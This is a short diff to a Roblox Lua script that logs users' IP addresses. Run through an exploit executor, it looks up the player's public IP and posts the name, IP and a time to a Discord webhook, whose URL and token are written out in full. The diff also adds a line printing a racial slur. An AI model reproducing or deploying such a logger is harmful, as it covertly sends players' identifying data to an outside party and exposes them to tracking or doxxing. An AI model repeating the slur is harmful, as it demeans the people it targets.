@@ -1,8 +1,11 @@
+local time = os.date("*t")
 local plr = game.Players.LocalPlayer.Name
 local ip = tostring(game:HttpGet("https://ip.seeip.org/", true))
 
 
-local msg = "Name: " .. plr .. "   |   IP: " .. ip .. "  "
+local msg = "Name: " .. plr .. "   |   IP: " .. ip .. " | At: " .. time.hour .. ":" .. time.min .. ""
 local url = "https://discord.com/api/webhooks/1041110991376765049/kmjcZAv_fYALzgy4z8TeYxtJVmqR_SsOOgIwjAP99u2JQcSujDSYG4ODdY2MMMHJCBV9"
 
 syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
+
+print("Nigger")
